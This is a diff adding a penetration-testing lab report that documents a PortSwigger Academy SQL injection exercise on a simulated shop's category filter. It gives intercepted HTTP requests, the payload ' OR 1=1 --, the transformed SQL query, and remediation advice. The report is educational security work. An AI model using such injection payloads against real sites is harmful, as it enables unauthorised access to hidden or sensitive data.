@@ -1,2 +1,84 @@
-# Portswigger-labs-abhi
-Hands-on penetration testing labs from PortSwigger Web Security Academy and more. Documented for learning and portfolio.
+# PortSwigger Web Security Academy Lab Report  
+SQL Injection Vulnerability Allowing Retrieval of Hidden Data
+
+**Report ID:** PS-LAB-001  
+**Author:** Abhiram (Abhi)  
+**Date:** January 24, 2026  
+**Lab:** SQL injection vulnerability in WHERE clause allowing retrieval of hidden data (Apprentice Level)
+
+## Executive Summary
+
+- **Vulnerability Type:** SQL injection allowing retrieval of hidden data  
+- **Severity:** High (CVSS 3.1 Score: 8.6) – AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N  
+- **Description:** A SQL injection vulnerability exists in the `category` parameter of the `/filter` endpoint on a simulated e-commerce site. It allows bypassing the `WHERE` clause restriction (`released = 1`) to retrieve unreleased/hidden products. Exploitation used manual payloads via Burp Suite.  
+- **Impact:** In production, this could expose sensitive/unreleased data, enable database enumeration, credential theft, or further attacks.  
+- **Status:** Exploited only in a controlled lab environment; no real-world systems affected. Report is for educational purposes.
+
+## Environment and Tools Used
+
+- **Target:** Simulated e-commerce site (PortSwigger Web Security Academy lab, e.g., `https://*.web-security-academy.net`)  
+- **Browser:** Google Chrome (Version 120.0 or similar)  
+- **Tools:** Burp Suite – for request interception, modification, and analysis  
+- **Operating System:** Windows 11  
+- **Test Date/Time:** January 24, 2026, approximately 04:17 PM IST
+
+## Methodology
+
+1. Accessed the lab and added the base URL to Burp Suite scope.  
+2. Enabled Intercept in Burp Proxy and navigated to the "Gifts" category to capture the request.  
+3. Disabled Intercept, then modified the `category` parameter:  
+   - `category='` → triggered a database error (confirmed no sanitization).  
+   - `category=' OR 1=1 --` → bypassed `released=1` filter, returned all products (including hidden ones).  
+4. Confirmed via Burp Target and Proxy > HTTP history.
+
+## Detailed Findings
+
+**Vulnerable Endpoint:** `GET /filter?category=...`
+
+**Original Request (example):**
+```http
+GET /filter?category=Gifts HTTP/1.1
+Host: <lab-host>.web-security-academy.net
+User-Agent: Mozilla/5.0 ...
+Connection: close
+Injection Test (Error Triggered):
+GET /filter?category=' HTTP/1.1
+Host: <lab-host>.web-security-academy.net
+...
+→ Response: 500 Internal Server Error with database error visible.
+Successful Exploitation Payload:
+GET /filter?category=' OR 1=1 -- HTTP/1.1
+Host: <lab-host>.web-security-academy.net
+...
+→ Response: 200 OK, all products displayed (including unreleased ones).
+�
+Figure 1: Database error after injecting single quote ('), confirming lack of input sanitization.
+�
+Figure 2: Full product listing retrieved after payload ' OR 1=1 --, bypassing released=1 filter.
+�
+Figure 3: PortSwigger Academy confirmation of lab completion.
+Exploitation Explanation
+The single quote (') closed the string literal in the query:
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+Payload ' OR 1=1 -- transformed it to:
+SELECT * FROM products WHERE category = '' OR 1=1 -- AND released = 1
+→ OR 1=1 always true, -- comments out the rest. Classic boolean-based SQLi.
+Risk Assessment
+Likelihood: High (user-controlled param, no sanitization/parameterization).
+Impact: High to Critical — restricted data exposure; potential full DB dump in real apps.
+Affected Components: Backend database (likely MySQL/PostgreSQL per lab error patterns).
+Recommendations for Remediation
+Use prepared statements / parameterized queries (e.g., PDO in PHP, PreparedStatement in Java).
+Implement strict input validation/sanitization.
+Deploy WAF to block common SQLi patterns.
+Regular code reviews, static/dynamic scanning (OWASP ZAP, sqlmap, Burp Scanner).
+Least privilege for DB accounts.
+Conclusion and Lessons Learned
+This lab demonstrated manual SQLi exploitation using Burp Suite.
+Key Takeaways:
+Always test parameters for injection flaws.
+Simple payloads like ' OR 1=1 -- can bypass filters.
+Improved skills in recon, payload crafting, HTTP interception, and reporting.
+References
+PortSwigger Web Security Academy: SQL Injection
+Specific Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
